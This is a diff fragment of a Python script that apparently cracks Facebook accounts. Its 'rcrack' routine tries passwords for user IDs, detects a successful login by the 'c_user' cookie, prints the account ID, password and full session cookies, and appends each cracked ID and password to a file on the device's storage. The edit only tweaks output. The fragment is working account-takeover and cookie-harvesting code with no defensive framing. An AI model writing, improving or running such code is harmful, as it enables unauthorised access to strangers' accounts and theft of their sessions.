@@ -257,10 +257,9 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[38;5;46m[TC⃝] '+cid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
-                os.system('espeak -a 300 "Congratulations. ok id"')
+                print('\033[38;5;46m[TC⃝] '+uid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
                 cek_apk(session,coki)
-                open('/sdcard/\033[38;5;46mTC⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/TC-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             else:
